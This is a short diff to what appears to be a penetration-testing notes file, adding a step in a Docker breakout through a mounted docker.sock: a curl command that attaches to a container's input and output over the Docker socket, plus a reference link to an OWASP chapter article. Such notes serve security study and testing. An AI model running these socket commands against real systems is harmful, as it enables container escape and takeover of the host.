@@ -1554,8 +1554,15 @@ curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/<i
 
 - Attach the process
 
+```bash
+curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/09832b2e10c61ffd863fe4c8a50e07d820cd9150af7e3bfd6be7b7400c9f7c94/attach\?stream\=1\&stdin\=1\&stdout\=1\&stderr\=1
+```
 
+-------------
 
+### REFERENCE-:
+
+- [Owasp-Vitcc](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158)
 
 
 
